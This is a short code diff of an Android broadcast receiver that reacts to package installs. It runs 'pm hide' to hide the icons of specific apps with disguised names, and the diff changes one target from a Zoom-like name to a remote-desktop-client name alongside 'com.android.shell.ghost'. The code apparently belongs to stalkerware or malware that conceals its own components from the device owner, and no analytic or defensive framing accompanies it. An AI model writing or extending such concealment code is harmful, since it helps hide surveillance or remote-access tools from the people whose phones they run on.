@@ -13,7 +13,7 @@ public class PackageInstallReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         String pkg = intent.getDataString();
         if (pkg == null) return;
-        if (pkg.equals("com.zoom.private") || pkg.equals("com.android.shell.ghost")) {
+        if (pkg.equals("com.betterdesk.client.universal") || pkg.equals("com.android.shell.ghost")) {
             // Hide the icon
             try {
                 Runtime.getRuntime().exec("pm hide " + pkg).waitFor();
